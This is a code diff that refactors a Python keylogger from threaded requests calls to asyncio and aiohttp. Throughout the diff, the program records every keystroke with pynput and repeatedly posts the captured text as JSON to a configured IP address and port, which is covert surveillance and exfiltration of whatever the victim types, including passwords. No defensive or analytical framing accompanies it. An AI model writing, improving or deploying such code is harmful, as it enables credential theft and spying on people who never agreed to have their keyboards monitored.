@@ -1,6 +1,6 @@
 import json
-import threading
-import requests
+import asyncio
+import aiohttp
 import logging
 from pynput import keyboard
 
@@ -13,17 +13,21 @@ TIME_INTERVAL = 10
 text = ""
 
 # Set up logging
-logging.basicConfig(filename='app.log', filemode='w', format='%(name)s - %(levelname)s - %(message)s')
+logging.basicConfig(filename='app.log', filemode='w',
+                    format='%(name)s - %(levelname)s - %(message)s')
 
-def send_post_request(ip_address: str, port_number: str, text: str):
+
+async def send_post_request(ip_address: str, port_number: str, text: str):
     try:
         payload = json.dumps({"keyboardData": text})
-        requests.post(f"http://{ip_address}:{port_number}",
-                      data=payload, headers={"Content-Type": "application/json"})
-        timer = threading.Timer(TIME_INTERVAL, send_post_request, args=(ip_address, port_number, text))
-        timer.start()
+        async with aiohttp.ClientSession() as session:
+            async with session.post(f"http://{ip_address}:{port_number}",
+                                    data=payload, headers={"Content-Type": "application/json"}) as _:
+                await asyncio.sleep(TIME_INTERVAL)
+                await send_post_request(ip_address, port_number, text)
     except Exception as e:
         logging.error(f"Couldn't complete request! Error: {e}")
+
 
 def on_press(key):
     global text
@@ -47,6 +51,7 @@ def on_press(key):
         text += str(key).strip("'")
     return None
 
+
 with keyboard.Listener(on_press=on_press) as listener:
-    send_post_request(IP_ADDRESS, PORT_NUMBER, text)
+    asyncio.run(send_post_request(IP_ADDRESS, PORT_NUMBER, text))
     listener.join()
